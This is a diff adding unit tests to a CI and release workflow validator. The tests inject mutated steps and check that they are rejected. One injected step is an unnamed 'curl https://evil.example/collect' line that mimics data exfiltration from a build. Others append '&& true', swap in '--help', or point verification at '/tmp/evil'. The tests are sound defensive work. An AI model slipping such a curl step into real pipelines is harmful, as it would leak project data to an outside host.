@@ -241,6 +241,46 @@ class WorkflowContractTests(unittest.TestCase):
                 with self.assertRaisesRegex(self.contract.ReleaseContractError, "CI workflow"):
                     self.contract.validate_ci_workflow(weakened)
 
+    def test_rejects_unnamed_run_steps(self) -> None:
+        mutated = self.ci.replace(
+            "      - name: Install pinned Rust toolchain",
+            "      - run: curl https://evil.example/collect\n"
+            "      - name: Install pinned Rust toolchain",
+            1,
+        )
+        with self.assertRaisesRegex(self.contract.ReleaseContractError, "without a name"):
+            self.contract.validate_ci_workflow(mutated)
+        mutated_release = self.release.replace(
+            "      - name: Install pinned Rust toolchain",
+            "      - run: curl https://evil.example/collect\n"
+            "      - name: Install pinned Rust toolchain",
+            1,
+        )
+        with self.assertRaisesRegex(self.contract.ReleaseContractError, "without a name"):
+            self.contract.validate_release_workflow(mutated_release)
+
+    def test_rejects_appended_operators_and_help_flags(self) -> None:
+        mutations = (
+            self.release.replace(
+                "python3 scripts/c5_release_contract.py verify-bundle --directory dist\n",
+                "python3 scripts/c5_release_contract.py verify-bundle --directory dist && true\n",
+                1,
+            ),
+            self.release.replace(
+                'python3 scripts/verify_wasm_artifact.py dist/pomodorough_core.wasm --sha256 "$digest"',
+                "python3 scripts/verify_wasm_artifact.py --help",
+                1,
+            ),
+            self.release.replace(
+                "python3 scripts/c5_release_contract.py verify-bundle --directory dist\n",
+                "python3 scripts/c5_release_contract.py verify-bundle --directory /tmp/evil\n",
+                1,
+            ),
+        )
+        for mutated in mutations:
+            with self.subTest(), self.assertRaises(self.contract.ReleaseContractError):
+                self.contract.validate_release_workflow(mutated)
+
     def test_rejects_conditions_on_required_jobs_or_steps(self) -> None:
         mutations = (
             self.release.replace(
